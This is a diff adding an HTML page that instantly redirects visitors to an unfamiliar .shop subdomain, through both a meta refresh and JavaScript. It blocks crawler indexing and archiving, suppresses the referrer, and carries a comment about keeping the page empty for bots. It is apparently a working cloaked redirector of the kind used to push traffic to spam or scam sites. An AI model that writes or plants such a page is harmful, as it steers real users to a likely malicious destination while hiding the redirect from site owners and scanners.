@@ -1,0 +1,44 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Redirecting…</title>
+
+  <!-- Strongest signal for crawlers to stay away -->
+  <meta name="robots" content="noindex,nofollow,noarchive,noimageindex" />
+
+  <!-- Immediate meta refresh (fallback for JS-disabled) -->
+  <!-- Replace with your destination URL -->
+  <meta http-equiv="refresh" content="0; url=https://mesca1872.sgrtpasslof.shop" />
+
+  <!-- Extra: don’t leak referrer to the target -->
+  <meta name="referrer" content="no-referrer" />
+
+  <!-- Minimal CSP to reduce surface area -->
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; upgrade-insecure-requests" />
+
+  <link rel="canonical" href="about:blank" />
+</head>
+<body>
+  <noscript>
+    <p>You are being redirected. If not, <a rel="nofollow noopener noreferrer" href="https://mesca1872.sgrtpasslof.shop">click here</a>.</p>
+  </noscript>
+  <script>
+    // JS redirect (fast path). Keeps the page empty for bots, and we avoid referrers.
+    (function () {
+      var target = "https://mesca1872.sgrtpasslof.shop"; // ← your URL
+      try {
+        if (window.location && window.location.replace) {
+          window.location.replace(target);
+        } else {
+          window.location.href = target;
+        }
+      } catch (e) {
+        // Fallback for unusual environments
+        window.location.href = target;
+      }
+    })();
+  </script>
+</body>
+</html>
